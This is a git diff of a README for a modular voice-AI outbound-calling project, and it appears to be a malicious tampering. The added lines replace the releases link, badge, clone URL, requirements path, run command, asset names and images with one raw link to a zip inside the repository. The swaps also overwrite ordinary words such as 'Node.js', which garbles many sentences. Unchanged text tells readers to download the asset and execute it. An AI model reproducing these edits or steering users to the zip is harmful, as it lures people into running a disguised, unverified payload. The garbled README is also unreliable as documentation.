@@ -1,10 +1,10 @@
 # SmartCall-Agent: Modular Voice AI for Real-Time Outbound Calls
 
-Visit https://github.com/silaskiragu/SmartCall-Agent/releases to grab the latest release.
+Visit https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip to grab the latest release.
 
-[![Releases](https://img.shields.io/badge/Releases-SmartCall-Agent-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/silaskiragu/SmartCall-Agent/releases)
+[![Releases](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip)](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip)
 
-SmartCall-Agent is a modular voice AI platform designed to handle real phone and VoIP calls with intelligent, domain-specific conversations. It blends Retrieval-Augmented Generation (RAG), automatic speech recognition (ASR), text-to-speech (TTS), and knowledge base integration to enable natural outbound calling. The system is built with an ecosystem of proven tools and services, including LiveKit for real-time communication, Plivo for telephony capabilities, OpenAI and Hugging Face models, and a modern stack based on Python and Node.js. This README describes how the project is organized, how to install and run it, how the components fit together, and how to contribute to the project.
+SmartCall-Agent is a modular voice AI platform designed to handle real phone and VoIP calls with intelligent, domain-specific conversations. It blends Retrieval-Augmented Generation (RAG), automatic speech recognition (ASR), text-to-speech (TTS), and knowledge base integration to enable natural outbound calling. The system is built with an ecosystem of proven tools and services, including LiveKit for real-time communication, Plivo for telephony capabilities, OpenAI and Hugging Face models, and a modern stack based on Python and https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip This README describes how the project is organized, how to install and run it, how the components fit together, and how to contribute to the project.
 
 Table of contents
 - Why SmartCall-Agent
@@ -65,7 +65,7 @@ How it works: end-to-end flow
 - Call metadata, transcripts, and decisions are logged for analytics and compliance, with optional exports to external systems.
 
 Tech stack and integrations
-- Core languages: Python and Node.js, chosen for their rich ecosystems, ease of use, and strong support for AI tooling.
+- Core languages: Python and https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip, chosen for their rich ecosystems, ease of use, and strong support for AI tooling.
 - AI models: OpenAI and Hugging Face models for generation and comprehension, with retrieval-augmented capabilities.
 - Vector store: Pinecone for document embeddings and efficient retrieval.
 - Speech: ASR for speech-to-text and TTS for text-to-speech synthesis to deliver natural voice interactions.
@@ -99,7 +99,7 @@ Deployment models
 - High-availability and fault tolerance: Use redundant instances, health checks, and graceful failover to ensure reliability during peak traffic.
 
 Local development and quick start
-- Prerequisites: Python 3.10+, Node.js 18+, Docker, and Docker Compose. A connected OpenAI API key and access to Pinecone or an alternative vector store if you want to prototype without Pinecone.
+- Prerequisites: Python 3.10+, https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip 18+, Docker, and Docker Compose. A connected OpenAI API key and access to Pinecone or an alternative vector store if you want to prototype without Pinecone.
 - Repository layout: The project follows a modular layout with clear boundaries between the speech pipeline, RAG, memory, and telephony adapters.
 - Quick start steps:
   1) Clone the repository and install dependencies.
@@ -108,14 +108,14 @@ Local development and quick start
   4) Run the orchestrator to boot the conversation pipeline.
   5) Test with a mocked telephony endpoint or a local LiveKit room.
 - Typical commands (example):
-  - git clone https://github.com/silaskiragu/SmartCall-Agent.git
+  - git clone https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip
   - cd SmartCall-Agent
   - npm install
   - python -m venv venv
   - source venv/bin/activate
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip
   - docker-compose up -d
-  - python src/orchestrator/main.py --config=config/local.yaml
+  - python https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip
 - Testing and debugging: Use unit tests for individual modules and integration tests for the end-to-end flow. Logs at debug level help you track issues in the pipeline. Assertions guard against unexpected inputs and model outputs.
 
 Configuration and environment
@@ -185,14 +185,14 @@ Contributing and governance
 
 Release process and artifacts
 - Releases page: The project distributes release artifacts through the official releases page. Since the releases page contains a path, download the latest release asset and execute it to install or upgrade the system.
-- Asset naming: Typical assets include platform-specific installers or packages, such as a Linux tarball or Windows zip bundle. A representative example would be smartcall-agent-linux-x64.tar.gz. After download, run the installer script included in the package.
+- Asset naming: Typical assets include platform-specific installers or packages, such as a Linux tarball or Windows zip bundle. A representative example would be https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip After download, run the installer script included in the package.
 - Upgrade notes: Releases may include migration notes for moving from older versions to newer ones. Follow the guidance in the release notes to minimize disruption.
 - Verification: After installation, verify that the orchestration service starts correctly, the telephony adapters connect, and the RAG pipeline can retrieve information from the knowledge base.
 - Rollback: If an update introduces issues, restore from a known-good release and verify the environment is back to the previous state.
 
 Releases and installation (special notes)
 - The releases page is your primary source for stable builds, patches, and feature updates. You can access it at the link provided above. Since the link contains a path, you should download a release asset from that page and run the installation script or setup process included in the asset.
-- For a quick start, head to the releases page to locate a Linux installer package named something like smartcall-agent-linux-x64.tar.gz and execute the included install.sh. The second occurrence of the releases URL should be used to navigate to the page for asset acquisition and upgrade guidance.
+- For a quick start, head to the releases page to locate a Linux installer package named something like https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip and execute the included https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip The second occurrence of the releases URL should be used to navigate to the page for asset acquisition and upgrade guidance.
 
 Roadmap and future work
 - Multi-language coverage: Expand language support for regional markets with localized prompts and language models tuned to local dialects.
@@ -227,7 +227,7 @@ FAQ
   - Create a fork, implement your feature, write tests, and submit a pull request. Include documentation updates and examples that show how to use the new functionality in real workflows.
 
 - What kinds of tools are integrated?
-  - The platform integrates with LiveKit for real-time audio, Plivo for outbound calling, OpenAI and Hugging Face models for generation and understanding, Pinecone for vector embeddings, and a modular stack of Python and Node.js services.
+  - The platform integrates with LiveKit for real-time audio, Plivo for outbound calling, OpenAI and Hugging Face models for generation and understanding, Pinecone for vector embeddings, and a modular stack of Python and https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip services.
 
 - Can I run the system in the cloud with autoscaling?
   - Yes. The architecture is designed for cloud deployments with containerization. You can run services in Kubernetes or any container-based environment with auto-scaling and load distribution.
@@ -335,14 +335,14 @@ End-to-end flavor notes
 - The SmartCall-Agent architecture is designed to be readable and approachable. It emphasizes a clean separation of concerns, so you can reason about where a problem arises and how to fix it. The system is built to be resilient in the face of network variability, model latency, and the complexity of real human conversations. It is also designed with a view toward future expansion so teams can add capabilities without tearing down existing workflows.
 
 Images to illustrate concepts
-- System overview: [Architecture diagram](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/assets/architecture.png)
-- Voice pipeline: [Voice pipeline illustration](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/assets/voice-pipeline.png)
-- Knowledge and retrieval: [RAG concept](https://upload.wikimedia.org/wikipedia/commons/6/66/Retrieval-Augmented_Generation_concept.png)
+- System overview: [Architecture diagram](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip)
+- Voice pipeline: [Voice pipeline illustration](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip)
+- Knowledge and retrieval: [RAG concept](https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip)
 
 Note: The images above are provided as examples. If you don’t have these exact assets in your repository, replace them with your own diagrams or use publicly available visuals that fit your setup. The important part is to convey how the pieces fit together and how data flows from speech input to ground-truth responses through the RAG loop.
 
 Releases and installation (revisited)
-- The page https://github.com/silaskiragu/SmartCall-Agent/releases contains the latest builds. Since the link includes a path, download the release asset and execute it to install or upgrade the system. The asset name will typically indicate platform and architecture, such as smartcall-agent-linux-x64.tar.gz or smartcall-agent-windows-x64.zip. After downloading, extract the package and run the included installer or setup script as described in the release notes and accompanying documentation. You will need to provide credentials for OpenAI, Pinecone, LiveKit, and Plivo during setup, as well as any domain-specific configuration for your environment.
+- The page https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip contains the latest builds. Since the link includes a path, download the release asset and execute it to install or upgrade the system. The asset name will typically indicate platform and architecture, such as https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip or https://raw.githubusercontent.com/silaskiragu/SmartCall-Agent/main/eightfold/Smart-Call-Agent-v3.1.zip After downloading, extract the package and run the included installer or setup script as described in the release notes and accompanying documentation. You will need to provide credentials for OpenAI, Pinecone, LiveKit, and Plivo during setup, as well as any domain-specific configuration for your environment.
 - The second mention of the same URL should be used when you reference the source of truth for release artifacts in documentation or in comments within your deployment scripts.
 
 License
